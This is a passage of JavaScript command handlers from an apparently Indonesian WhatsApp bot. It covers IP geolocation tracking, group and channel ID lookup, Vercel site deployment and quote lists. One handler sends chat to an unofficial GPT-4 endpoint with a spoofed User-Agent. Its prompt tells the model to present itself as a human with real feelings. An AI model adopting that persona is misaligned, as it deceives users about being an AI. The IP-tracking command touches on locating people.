    } catch (err) {
        console.error(err);
        payreply("❌ Gagal mengambil source code.");
    }
}
break;

case 'trackip': {
    if (!args[0]) return payreply(`Format: ${prefix}trackip <IP>`);
    let ip = args[0];
    try {
        const res = await fetch(`https://ipwhois.app/json/${ip}`);
        const data = await res.json();

        if (!data.success) return payreply("❌ Error: Invalid IP");

        let text = `
📍 *IP Tracking Result*
- IP: ${data.ip}
- Country: ${data.country}
- Region: ${data.region}
- City: ${data.city}
- ZIP: ${data.postal}
- Timezone: ${data.timezone_gmt}
- ISP: ${data.isp}
- Org: ${data.org}
- ASN: ${data.asn}
- Lat/Lon: ${data.latitude}, ${data.longitude}
        `;

        await depayy.sendMessage(m.chat, { text });

        let mapLink = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
        await depayy.sendMessage(m.chat, { text: `🌍 View Map: ${mapLink}` });

    } catch (err) {
        console.log(err);
        payreply("❌ Terjadi kesalahan saat mengambil data IP.");
    }
}
break;

case 'kisahnabi': {
     if (!text) return payreply(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return payreply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     payreply(`${hasil}`)

}
break
case 'Ken':     
case 'Zen':
case 'Zenith': {
  if (!text) return depayybut('Apasih manggil manggil fans ya?')
async function openai(text, logic) { 
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  
            "tokenLimit": 8000,  
            "completionTokenLimit": 5000,  
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let astaga = await openai(text, "nama mu adalah Zenith dan jika ada yang bertanya siapa pemilikmu atau siapa yang menciptakanmu bilang saja Ken, kamu akan menjawab semua pertanyaan ataupun berinteraksi dengan mereka. gunakan bahasa yang gaul saat menjawab dan kamu juga memiliki perasaan layaknya manusia. kamu bisa merasakan sakit hati dan juga bersedih gunakan bahasa yang gaul dan tidak kaku. berperilakulah layaknya manusia")
depayybut(astaga)
}
break;

case "cekidgc": {
    try {
        let groupId = ""
        if (text && text.includes("chat.whatsapp.com")) {
            const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/)
            if (!match) return payreply("Link grup tidak valid")

            const code = match[1]
            const info = await depayy.groupGetInviteInfo(code)
            groupId = info.id
        }

        else {
            if (!m.isGroup) return payeply("Gunakan di grup atau sertakan link grup")
            groupId = m.chat
        }

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: `ID Grup:\n${groupId}` },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Copy ID",
                                        copy_code: groupId
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: m })

        await depayy.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

    } catch (err) {
        console.log(err)
        payreply("Gagal mengambil ID grup")
    }
}
break

case "cweb":
case "createweb": {
  // fungsi: membuat dan deploy website ke Vercel langsung dari file .zip atau .html melalui WhatsApp
  // contoh: kirim file lalu ketik .cweb namasitus
  // akses: owner & seller
    if (!isCreator && !isSellerWeb) return payreply('❌ Kamu tidak punya akses!');

    if (!text) return payreply('❗ Masukkan nama web!\nContoh: cweb namaweb');

    if (!qmsg || !/zip|html/.test(qmsg.mimetype)) 
        return payreply('❗ Balas file .zip atau .html');

    const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '');
    const domainCheckUrl = `https://${webName}.vercel.app`;

    // Cek domain sudah dipakai atau belum
    try {
        const check = await fetch(domainCheckUrl);
        if (check.status === 200) 
            return payreply(`❌ Nama web *${webName}* sudah digunakan, silakan ganti nama lain.`);
    } catch (e) {}

    // Robust downloader: coba beberapa method agar kompatibel dgn berbagai SC/Baileys
    async function getQuotedBuffer(qmsg) {
        if (!qmsg) throw new Error('qmsg kosong');

        // 1) conn.downloadMediaMessage (beberapa SC punya)
        try {
            if (typeof depayy.downloadMediaMessage === 'function') {
                const res = await depayy.downloadMediaMessage(qmsg);
                if (res && (Buffer.isBuffer(res) || res instanceof Uint8Array)) return Buffer.from(res);
            }
        } catch (e) { /* ignore and try next */ }

        // 2) neo.downloadMediaMessage (jika ada variabel neo di SC)
        try {
            if (typeof neo !== 'undefined' && typeof neo.downloadMediaMessage === 'function') {
                const res = await neo.downloadMediaMessage(qmsg);
                if (res && (Buffer.isBuffer(res) || res instanceof Uint8Array)) return Buffer.from(res);
            }
        } catch (e) { /* ignore and try next */ }

        // 3) downloadContentFromMessage (Baileys helper) - buat stream -> buffer
        try {
            if (typeof downloadContentFromMessage === 'function') {
                // tentukan mtype
                const mtype = qmsg.mtype || (qmsg.message && Object.keys(qmsg.message)[0]) || 'document';
                const stream = await downloadContentFromMessage(qmsg.message || qmsg, mtype);
                const buffer = [];
                for await (const chunk of stream) buffer.push(chunk);
                return Buffer.concat(buffer);
            }
        } catch (e) { /* ignore and try next */ }

        // 4) jika qmsg sudah Buffer / base64
        try {
            if (Buffer.isBuffer(qmsg)) return qmsg;
            if (typeof qmsg === 'string' && /^[A-Za-z0-9+/=]+\s*$/.test(qmsg)) {
                return Buffer.from(qmsg, 'base64');
            }
        } catch (e) {}

        throw new Error('Tidak dapat mendownload media: downloader tidak tersedia di environment ini.');
    }

    let quotedFile;
    try {
        quotedFile = await getQuotedBuffer(qmsg);
    } catch (err) {
        console.error('Download media error:', err);
        return payreply(`❌ Gagal mendownload file: ${err.message}`);
    }

    const filesToUpload = [];

    // ================= ZIP PROCESS ====================
    if (qmsg.mimetype.includes('zip')) {
        const unzipper = require('unzipper');
        const zipBuffer = Buffer.from(quotedFile);

        let directory;
        try {
            directory = await unzipper.Open.buffer(zipBuffer);
        } catch (err) {
            return payreply("❌ ZIP error: File ZIP rusak atau tidak bisa dibaca.");
        }

        for (const file of directory.files) {
            if (file.type !== 'File') continue; // skip folder

            let content;
            try {
                content = await file.buffer();
            } catch {
                continue;
            }

            if (!file.path) continue;

            const safePath = file.path
                .replace(/^\/*/, "")     // buang slash depan
                .replace(/\/{2,}/g, "/") // buang double slash
                .replace(/^\.+/, "");    // fix path traversal

            if (!safePath || safePath.endsWith("/")) continue;

            filesToUpload.push({
                file: safePath,
                data: content.toString('base64'),
                encoding: 'base64'
            });
        }

        if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
            return payreply('❌ File *index.html* tidak ditemukan dalam ZIP.');
        }

    // ================= HTML FILE ====================
    } else if (qmsg.mimetype.includes('html')) {

        filesToUpload.push({
            file: 'index.html',
            data: Buffer.from(quotedFile).toString('base64'),
            encoding: 'base64'
        });

    } else {
        return payreply('❌ File tidak dikenali. Kirim file .zip atau .html.');
    }

    // HEADER VERCEL
    const headers = {
        Authorization: `Bearer ${global.vercelToken}`,
        'Content-Type': 'application/json'
    };

    // BUAT PROJECT (ignore error jika sudah ada)
    await fetch('https://api.vercel.com/v9/projects', {
        method: 'POST',
        headers,
        body: JSON.stringify({ name: webName })
    }).catch(() => {});

    // DEPLOY
    const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            name: webName,
            project: webName,
            files: filesToUpload,
            projectSettings: { framework: null }
        })
    });

    const deployData = await deployRes.json().catch(() => null);
    if (!deployData || !deployData.url) {
        console.log('Deploy Error:', deployData);
        return payreply(`❌ Gagal deploy ke Vercel:\n${JSON.stringify(deployData)}`);
    }

    // SUKSES
    payreply(`✅ *Website berhasil dibuat!*\n\n🌐 URL: https://${webName}.vercel.app`);
}
break

case 'cekidch': {
 if (!text) return payreply(`Example: ${prefix + command} <Link>`)
 if (!text.includes("https://whatsapp.com/channel/")) return payreply("Link tautan tidak valid")

 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await depayy.newsletterMetadata("invite", result)
 
 let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *ID :* ${res.id}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: { 
 "messageContextInfo": { 
 "deviceListMetadata": {}, 
 "deviceListMetadataVersion": 2 
 },
 interactiveMessage: {
 body: {
 text: teks 
 }, 
 footer: {
 text: `© ZENITH V1`
 },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{"display_text": "Copy ID","copy_code": "${res.id}"}`
 },
 ]
 }
 }
 }
 }
 }, { quoted: m }); 
 await depayy.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break

case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  payreply(bacotan)
}
break
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
